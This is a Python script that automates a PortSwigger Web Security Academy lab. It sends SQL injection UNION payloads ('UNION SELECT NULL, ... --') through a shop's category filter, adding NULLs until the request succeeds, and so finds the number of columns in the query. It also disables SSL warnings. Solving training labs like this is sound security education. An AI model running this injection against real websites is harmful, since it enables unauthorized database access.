#!/usr/bin/env python3
import requests
import functools
from dataclasses import dataclass, field
from typing import Any
import sys
import logging


# Disable warnings generated due to unverified SSL connections
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

"""
Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
To solve the lab, perform an SQL injection UNION attack that returns an additional row containing null values.
"""


@dataclass()
class Validator:
    """Validate Requests Objects"""
    request: Any
    response: Any = field(init=False)
    num_calls: int = field(init=False, default=0)

    def __post_init__(self):
        functools.update_wrapper(self, self.request)

    def __call__(self, *args, **kwargs):
        self.num_calls += 1
        logger.debug(f"Call {self.num_calls} of {self.request.__name__!r} with {kwargs}")

        try:

            if self.request(*args, **kwargs):
                logger.info('Eureka!')
            else:
                logger.info(f'Request without args: {self.request}')
                logger.info(f'Request with args: {self.request(*args, **kwargs)}')

            self.response = self.request(*args, **kwargs)
            self.response.raise_for_status()
        except requests.exceptions.HTTPError:
            if self.response.status_code == 404:
                help_msg = 'The session you are looking for has expired.'
                sys.exit(f'{self.response.status_code}: {self.response.reason}. {help_msg}')
            elif self.response.status_code == 500:
                help_msg = 'Hmm, still looking for null values'
                logger.debug(help_msg)
        except requests.exceptions.ConnectionError as error:
            help_msg = 'Please make sure you are using a valid URL.'
            sys.exit(f'{help_msg}\n{error}')
        except requests.exceptions.Timeout:
            help_msg = 'Request timed out. This may be due to using an outdated lab URL.'
            sys.exit(f'{help_msg}')
        except requests.exceptions.RequestException as error:
            help_msg = 'Caught general exception:'
            sys.exit(f'{help_msg} {error}')
        return self.response


requests.Session.request = Validator(requests.Session().request)

@dataclass()
class Injection:
    lab_url: str = field()
    parameters: dict = field(default_factory=dict)
    session: requests.Session = field(default=requests.Session())
    null: list = field(default_factory=list)

    def __post_init__(self):
        self.lab_url = f'{self.lab_url}filter' if self.lab_url.endswith('/') else f'{self.lab_url}/filter'
        self.null = ["'UNION SELECT", 'NULL', '--']
        self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"

    def null_logic(self):
        response = self.session.get(url=self.lab_url, params=self.parameters, timeout=5)

        while not response.ok:
            # Remove '--' then add ', NULL --' until response.ok is True
            self.null.remove('--')
            self.null.extend([',', 'NULL', '--'])
            self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"
            response = self.session.get(url=self.lab_url, params=self.parameters)


if __name__ == '__main__':
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.DEBUG)
    handler = logging.StreamHandler()
    handler.setLevel(logging.DEBUG)
    formatter = logging.Formatter('%(levelname)s - %(message)s')
    handler.setFormatter(formatter)
    logger.addHandler(handler)

    lab_url = 'https://abcd.web-security-academy.net/'

    sqli = Injection(lab_url=lab_url)
    sqli.null_logic()

    print(f"There are {sqli.null.count('NULL')} columns.")
